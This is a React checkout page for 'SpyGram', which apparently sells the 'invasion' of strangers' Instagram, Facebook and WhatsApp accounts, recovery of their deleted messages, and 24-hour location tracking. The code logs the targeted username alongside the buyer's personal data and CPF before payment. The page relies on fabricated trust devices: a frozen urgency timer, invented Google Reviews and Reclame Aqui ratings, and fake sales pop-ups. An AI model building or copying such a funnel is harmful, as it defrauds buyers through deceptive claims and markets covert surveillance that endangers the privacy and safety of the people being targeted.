import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ShoppingCart, ChevronRight, QrCode, ShieldCheck, Lock, Check, Clock, CreditCard, Mail, User, Phone, FileText, Star, X } from 'lucide-react';
import SalesNotification from '../components/SalesNotification';
import PixPaymentDisplay from '../components/PixPaymentDisplay';
import { supabase } from '../integrations/supabase/client';
import toast from 'react-hot-toast';
import { trackLead } from '../services/trackingService';

const CHECKOUT_URL = 'https://go.perfectpay.com.br/PPU38CPUD1S';

const maskCPFOrCNPJ = (value: string) => {
  const v = value.replace(/\D/g, '');
  if (v.length <= 11) {
    return v.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})/, '$1-$2').replace(/(-\d{2})\d+?$/, '$1');
  } else {
    return v.replace(/(\d{2})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1/$2').replace(/(\d{4})(\d{1,2})/, '$1-$2').replace(/(-\d{2})\d+?$/, '$1');
  }
};

const maskPhone = (value: string) => {
  const v = value.replace(/\D/g, '');
  return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2').replace(/(-\d{4})\d+?$/, '$1');
};

const CheckoutPage: React.FC = () => {
  const navigate = useNavigate();
  const [timeLeft, setTimeLeft] = useState(0); // 00:00 como no print
  const [isProcessing, setIsProcessing] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  
  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    whatsapp: '',
    documento: ''
  });
  
  const [bumps, setBumps] = useState({
    pro: false,
    social: false,
    recover: false,
    track: false
  });

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const basePrice = 29.90;
  const bumpDetails = {
    pro: { 
      title: 'ADQUIRIR TAMBÉM ACESSO VITALÍCIO AO SPYGRAM PRO', 
      price: 9.90, 
      img: '/order-bumps/vitalicio.jpg', 
      desc: 'Tenha acesso permanente a ferramenta SpyGram PRO!', 
      checkText: '✅ À VISTA POR R$ 9,90' 
    },
    social: { 
      title: 'ADQUIRIR TAMBÉM ESPIÃO INSTAGRAM + FACEBOOK + WHATSAPP', 
      price: 19.90, 
      img: '/order-bumps/social.jpg', 
      desc: 'Tenha acesso a todas as redes sociais de quem você quiser!', 
      checkText: '✅ À VISTA POR R$ 19,90' 
    },
    recover: { 
      title: 'ADQUIRIR TAMBÉM RECUPERADOR DE MENSAGENS APAGADAS', 
      price: 15.90, 
      img: '/order-bumps/recover.jpg', 
      desc: 'Recupere todas as mensagens apagadas do instagram!', 
      checkText: '✅ À VISTA POR R$ 15,90' 
    },
    track: { 
      title: 'ADQUIRIR TAMBÉM RASTREAMENTO 24 HORAS', 
      price: 15.90, 
      img: '/order-bumps/track.jpg', 
      desc: 'Rastreie a pessoa que quiser usando somente o celular por tempo ilimitado! Saiba cada passo dela!', 
      checkText: '✅ À VISTA POR R$ 15,90' 
    }
  };

  const adicionais = Object.keys(bumps).reduce((acc, key) => {
    return bumps[key as keyof typeof bumps] ? acc + (bumpDetails[key as keyof typeof bumpDetails]?.price || 0) : acc;
  }, 0);

  const total = basePrice + adicionais;

  const handleFinalize = async () => {
    if (!formData.nome || !formData.email || !formData.documento) {
        toast.error("Preencha todos os dados.");
        return;
    }

    setIsProcessing(true);
    const toastId = toast.loading("Gerando PIX...");

    const currentLeadId = sessionStorage.getItem('current_lead_id');
    const invasionDataRaw = sessionStorage.getItem('invasionData');
    const invasionData = invasionDataRaw ? JSON.parse(invasionDataRaw) : null;

    await trackLead({
      username_searched: invasionData?.profileData?.username,
      profile_pic: invasionData?.profileData?.profilePicUrl,
      email: formData.email,
      phone: formData.whatsapp,
      full_name: formData.nome,
      document: formData.documento,
      status: 'gerou_pix',
      amount: total
    });

    try {
        const { data, error } = await supabase.functions.invoke('royal-banking-payment', {
            body: { 
                name: formData.nome,
                email: formData.email,
                document: formData.documento,
                phone: formData.whatsapp,
                amount: total,
                leadId: currentLeadId
            },
        });

        if (error) throw error;

        if (data.paymentCode) {
            setPixData({
              paymentCode: data.paymentCode,
              paymentCodeBase64: data.paymentCodeBase64,
              idTransaction: data.idTransaction,
              amount: total,
              leadInfo: { 
                ...formData,
                username_searched: invasionData?.profileData?.username,
                profile_pic: invasionData?.profileData?.profilePicUrl
              }
            });
            toast.success("PIX Gerado!", { id: toastId });
        } else {
            window.location.href = CHECKOUT_URL;
        }

    } catch (err) {
        toast.error("Erro ao gerar PIX. Redirecionando...", { id: toastId });
        setTimeout(() => window.location.href = CHECKOUT_URL, 2000);
    } finally {
        setIsProcessing(false);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    let maskedValue = value;
    if (name === 'documento') maskedValue = maskCPFOrCNPJ(value);
    else if (name === 'whatsapp') maskedValue = maskPhone(value);
    setFormData(prev => ({ ...prev, [name]: maskedValue }));
  };

  const toggleBump = (key: keyof typeof bumps) => {
    setBumps(prev => ({ ...prev, [key]: !prev[key] }));
  };

  if (pixData) {
    return (
      <div className="min-h-screen bg-[#f4f4f4] py-12 px-4">
        <PixPaymentDisplay 
          paymentCode={pixData.paymentCode}
          paymentCodeBase64={pixData.paymentCodeBase64}
          transactionId={pixData.idTransaction}
          amount={pixData.amount}
          leadData={pixData.leadInfo}
          onConfirm={() => toast.success("Aguardando confirmação...")}
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f4f4f4] text-[#333] font-sans pb-20">
      <SalesNotification />
      
      {/* Timer Header */}
      <div className="w-full bg-[#f15c5c] text-white py-2 px-4 flex items-center justify-center sticky top-0 z-50 shadow-md gap-3">
        <span className="text-[11px] font-bold uppercase tracking-tight">SUA VAGA ESTÁ GARANTIDA ENQUANTO ESTIVER NESSA PÁGINA!</span>
        <div className="flex items-center gap-1">
           <Clock size={16} />
           <span className="text-[14px] font-black uppercase">00:00</span>
        </div>
      </div>

      {/* Hero Section */}
      <section className="bg-white pt-10 pb-8 flex flex-col items-center">
        <div className="relative mb-6">
          <img src="/spygram_transparentebranco.png" alt="SpyGram" className="h-14 brightness-0 mx-auto" />
          <div className="flex justify-center -space-x-4 mt-8">
            {[1,2,3,4,5,6,7,8,9,10,11,12].map(i => (
              <div key={i} className="w-16 h-16 rounded-full border-2 border-white shadow-xl overflow-hidden bg-gray-200">
                <img src="/perfil.jpg" alt="User" className="w-full h-full object-cover grayscale opacity-40" />
              </div>
            ))}
          </div>
        </div>

        <div className="text-center max-w-2xl px-4">
          <h1 className="text-3xl md:text-5xl font-black mb-4 tracking-tighter uppercase leading-tight">
            +12,3mil pessoas utilizam <br /> e aprovam o SpyGram®.
          </h1>
          <p className="text-gray-500 text-sm md:text-lg font-medium leading-relaxed mb-8">
            Este aplicativo foi testado e aprovado por profissionais, contando com o selo de confiança 'Google Reviews'.
          </p>

          <div className="bg-white border border-gray-100 rounded-3xl p-6 shadow-sm inline-flex flex-col md:flex-row items-center gap-10">
            <div className="flex items-center gap-4">
              <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" className="h-6" />
              <div className="text-left">
                <p className="font-black text-xs uppercase tracking-widest text-gray-400">GOOGLE REVIEWS:</p>
                <p className="font-black text-xl">(12,3mil) Avaliações</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <div className="flex text-yellow-400">
                {[1,2,3,4,5].map(i => <Star key={i} size={24} fill="currentColor" />)}
              </div>
              <span className="font-black text-2xl text-gray-500">(4,9)</span>
            </div>
          </div>
        </div>
      </section>

      {/* Info Bar */}
      <div className="max-w-6xl mx-auto px-4 mt-8 mb-10">
        <div className="bg-white rounded-xl py-3 px-5 flex items-center gap-3 shadow-sm border border-gray-100">
          <ShoppingCart size={18} className="text-gray-300" />
          <p className="text-[10px] font-black uppercase text-gray-400 tracking-widest">
            VOCÊ ESTÁ ADQUIRIRINDO: <span className="text-gray-600">Relatório SpyGram Completo</span>
          </p>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4">
        
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
          
          {/* Coluna Esquerda: Banner e Formulários */}
          <div className="lg:col-span-8 space-y-10">
            
            {/* Banner Section */}
            <div className="w-full rounded-[1.5rem] overflow-hidden shadow-2xl">
              <img src="/banner-checkout-final.jpg" alt="Banner Final" className="w-full h-auto block" />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
              
              {/* Section 1: Dados Pessoais */}
              <div className="bg-white rounded-[1.5rem] shadow-sm border border-gray-100 overflow-hidden">
                <div className="bg-[#e9e9e9] p-4 border-b border-gray-200 flex items-center gap-3">
                   <div className="w-7 h-7 rounded-full bg-[#afafaf] flex items-center justify-center text-white text-[12px] font-black">1</div>
                   <h3 className="font-black text-[#afafaf] uppercase tracking-widest text-[10px]">Dados Pessoais</h3>
                </div>
                <div className="p-6 space-y-4">
                   <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-500 uppercase ml-1">Nome completo</label>
                      <input type="text" name="nome" value={formData.nome} onChange={handleChange} placeholder="Teste" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none bg-white" />
                   </div>
                   <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-500 uppercase ml-1">E-mail</label>
                      <input type="email" name="email" value={formData.email} onChange={handleChange} placeholder="bellycompany@gmail.com" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none bg-white" />
                   </div>
                   <div className="space-y-1">
                      <label className="text-[11px] font-bold text-gray-500 uppercase ml-1">Telefone</label>
                      <input type="tel" name="whatsapp" value={formData.whatsapp} onChange={handleChange} placeholder="(21) 998510231" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none bg-white" />
                   </div>
                </div>
              </div>

              {/* Section 2: Pagamento */}
              <div className="bg-white rounded-[1.5rem] shadow-sm border border-gray-100 overflow-hidden">
                <div className="bg-[#e9e9e9] p-4 border-b border-gray-200 flex items-center gap-3">
                   <div className="w-7 h-7 rounded-full bg-[#afafaf] flex items-center justify-center text-white text-[12px] font-black">2</div>
                   <h3 className="font-black text-[#afafaf] uppercase tracking-widest text-[10px]">Pagamento</h3>
                </div>
                
                <div className="p-6">
                   <div className="grid grid-cols-2 gap-2 mb-6">
                      <button className="flex items-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg text-[10px] font-black uppercase text-gray-400 opacity-60"><CreditCard size={16} /> Cartão de Crédito</button>
                      <button className="flex items-center gap-2 px-3 py-2.5 border border-gray-200 rounded-lg text-[10px] font-black uppercase text-gray-400 opacity-60"><FileText size={16} /> Boleto</button>
                      <button className="flex items-center justify-between px-3 py-2.5 border-2 border-[#78cc6d] bg-white rounded-lg text-[10px] font-black uppercase text-[#78cc6d] relative">
                         <div className="flex items-center gap-2"><QrCode size={16} /> Pix</div>
                         <div className="bg-[#78cc6d] rounded-full p-0.5"><Check size={10} className="text-white" /></div>
                      </button>
                      <img src="https://logodownload.org/wp-content/uploads/2018/05/picpay-logo.png" className="h-10 object-contain p-2 border border-gray-200 rounded-lg grayscale opacity-50" alt="PicPay" />
                   </div>

                   <div className="space-y-4">
                      <div className="bg-white border border-gray-100 rounded-lg p-4 text-[10px] text-gray-400 space-y-3 leading-tight">
                         <p>01. Pagamento em segundos, sem complicações</p>
                         <p>02. Basta escanear, com o aplicativo do seu banco, o QRCode que iremos gerar sua compra</p>
                         <p>03. O PIX foi desenvolvido pelo Banco Central para facilitar suas compras e é 100% seguro.</p>
                      </div>
                      <div className="space-y-1">
                        <label className="text-[11px] font-bold text-gray-500 uppercase ml-1">CPF ou CNPJ</label>
                        <input type="text" name="documento" value={formData.documento} onChange={handleChange} placeholder="CPF ou CNPJ" className="w-full border border-gray-200 rounded-lg px-4 py-3 text-sm outline-none" />
                      </div>
                   </div>
                </div>
              </div>

            </div>

            {/* Section 3: Compre Junto (Fiel ao Modelo) */}
            <div className="bg-white rounded-[1.5rem] shadow-sm border border-gray-100 overflow-hidden">
              <div className="bg-[#e9e9e9] p-4 border-b border-gray-200 flex items-center gap-3">
                 <div className="w-7 h-7 rounded-full bg-[#afafaf] flex items-center justify-center text-white text-[12px] font-black">3</div>
                 <h3 className="font-black text-[#afafaf] uppercase tracking-widest text-[10px]">Compre Junto</h3>
              </div>
              
              <div className="p-8">
                 <div className="bg-[#78cc6d] text-white py-1 px-3 rounded-md text-[10px] font-black uppercase inline-block mb-4">APROVEITE!</div>
                 <p className="text-[12px] font-bold mb-8 leading-tight">70% das pessoas que compraram <span className="text-gray-800">Relatório SpyGram Completo</span> também se interessaram por:</p>
                 
                 <div className="space-y-4 mb-10">
                   {Object.entries(bumpDetails).map(([key, item]) => (
                     <div key={key} onClick={() => toggleBump(key as keyof typeof bumps)} className="flex items-start gap-6 p-6 border border-gray-100 rounded-[1.5rem] bg-[#fdfdfd] cursor-pointer hover:shadow-md transition-all">
                        <img src={item.img} className="w-20 h-20 rounded-xl object-contain bg-white p-2 border border-gray-100" alt="Icon" />
                        <div className="flex-1">
                           <div className="flex justify-between items-start">
                              <p className="text-[11px] font-black text-gray-500 uppercase leading-snug flex-1">
                                {item.title} <span className="text-[#78cc6d]">{item.checkText}</span>
                              </p>
                              <div className={`w-6 h-6 border-2 rounded transition-colors flex-shrink-0 ${bumps[key as keyof typeof bumps] ? 'bg-white border-gray-300' : 'bg-white border-gray-300'}`}>
                                 <input type="checkbox" checked={bumps[key as keyof typeof bumps]} onChange={() => {}} className="w-full h-full opacity-0 absolute cursor-pointer" />
                                 {bumps[key as keyof typeof bumps] && <Check size={18} className="text-[#78cc6d] font-bold" />}
                              </div>
                           </div>
                           <p className="text-[11px] text-[#f15c5c] font-bold mt-2">{item.desc}</p>
                        </div>
                     </div>
                   ))}
                 </div>

                 <button onClick={handleFinalize} disabled={isProcessing} className="w-full bg-[#78cc6d] hover:bg-[#6ab961] text-white py-4 rounded-xl font-black text-lg uppercase shadow-xl shadow-green-500/20 active:scale-95 transition-all flex items-center justify-center gap-2">
                    {isProcessing ? <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <>Finalizar Compra <ChevronRight size={22} /></>}
                 </button>
                 
                 <div className="flex flex-col items-center gap-3 mt-6">
                    <div className="flex items-center gap-2 text-[11px] font-bold text-green-600">
                       <Lock size={14} /> Pagamento 100% seguro, processado com criptografia 128bits.
                    </div>
                    <p className="text-[10px] text-gray-400 text-center">Produto digital, os dados para acesso serão enviados por email.</p>
                 </div>
              </div>
            </div>

          </div>

          {/* Coluna Direita: Resumo da Compra (Sticky) */}
          <div className="lg:col-span-4">
            <div className="sticky top-24 space-y-6">
               <div className="bg-white rounded-[1.5rem] shadow-xl border border-gray-100 overflow-hidden">
                  <div className="bg-[#e9e9e9] p-4 border-b border-gray-200 flex justify-center">
                    <h3 className="font-black text-[#afafaf] uppercase tracking-widest text-[10px]">Resumo da Compra</h3>
                  </div>
                  <div className="p-8 flex flex-col items-center">
                     <img src="/spygram_transparentebranco.png" className="h-14 brightness-0 opacity-80 mb-10" alt="SpyGram" />
                     
                     <div className="w-full text-center mb-8">
                        <p className="text-sm font-black text-gray-800">Relatório SpyGram Completo</p>
                        <p className="text-[10px] text-gray-400 font-bold uppercase mt-1">Relatório Completo SpyGram® 🕵️ ✅</p>
                     </div>

                     <div className="w-full space-y-4 border-t border-gray-100 pt-6">
                        <div className="flex justify-between items-center text-[11px] font-bold">
                           <span className="text-gray-400">Relatório SpyGram Completo</span>
                           <span className="text-[#78cc6d]">R$ 29,90</span>
                        </div>
                        
                        {Object.entries(bumps).map(([key, isActive]) => isActive && (
                          <div key={key} className="flex justify-between items-center text-[11px] font-bold animate-fade-in">
                            <span className="text-gray-400">{bumpDetails[key as keyof typeof bumpDetails].title.substring(0, 25)}...</span>
                            <span className="text-[#78cc6d]">R$ {bumpDetails[key as keyof typeof bumpDetails].price.toFixed(2).replace('.', ',')}</span>
                          </div>
                        ))}

                        <div className="bg-[#f2f2f2] p-3 rounded-lg flex justify-between items-center mt-6">
                           <span className="text-[10px] font-black text-gray-400 uppercase">Total Hoje:</span>
                           <span className="text-sm font-black text-[#78cc6d]">R$ {total.toFixed(2).replace('.', ',')}</span>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
          </div>

        </div>

        {/* Rodapé Fiel ao Modelo */}
        <footer className="mt-20 space-y-12">
           <div className="bg-white rounded-2xl p-6 flex flex-col md:flex-row items-center justify-between gap-6 shadow-sm border border-gray-100">
              <p className="text-[11px] font-bold text-gray-500 uppercase">E-MAIL DE SUPORTE: contato@spygram.com.br</p>
              <div className="flex items-center gap-8">
                <div className="flex flex-col items-end">
                   <span className="text-[9px] font-black text-gray-400 uppercase">PAGAMENTO PROCESSADO POR:</span>
                   <img src="https://perfectpay.com.br/wp-content/uploads/2021/04/logo-perfectpay-site.png" className="h-4 mt-1" alt="PerfectPay" />
                </div>
                <div className="bg-[#78cc6d] text-white py-2.5 px-6 rounded-lg inline-flex items-center gap-2 text-[10px] font-black uppercase shadow-md">
                   <ShieldCheck size={16} /> COMPRA 100% SEGURA
                </div>
              </div>
           </div>

           <div className="text-center space-y-4 text-gray-400 text-[10px]">
             <p>Esta compra será processada por: PerfectPay © 2026 - Todos os direitos reservados.</p>
             <p>* * Taxa de 2,99% a.m.</p>
             <p>Ao continuar nesta compra, você concorda com os <span className="underline">Termos de Compra</span> e <span className="underline">Termos de Privacidade</span>.</p>
             <p className="text-gray-300 font-bold uppercase tracking-widest pt-4">Ref: PPA22ZU8 <br /> SN: 6A0BEB66D8980N</p>
             
             <div className="pt-8">
               <div className="bg-white border border-gray-200 rounded-xl p-3 inline-flex items-center gap-4">
                 <img src="https://static.reclameaqui.com.br/core/images/logo-reclame-aqui.png" alt="Reclame Aqui" className="h-6" />
                 <div className="flex flex-col items-start border-l border-gray-200 pl-4">
                    <span className="text-[10px] font-black text-green-600 uppercase">RA 1000</span>
                    <span className="text-[8px] font-bold text-gray-400">ReclameAqui</span>
                 </div>
               </div>
             </div>
           </div>
        </footer>
      </div>
    </div>
  );
};

export default CheckoutPage;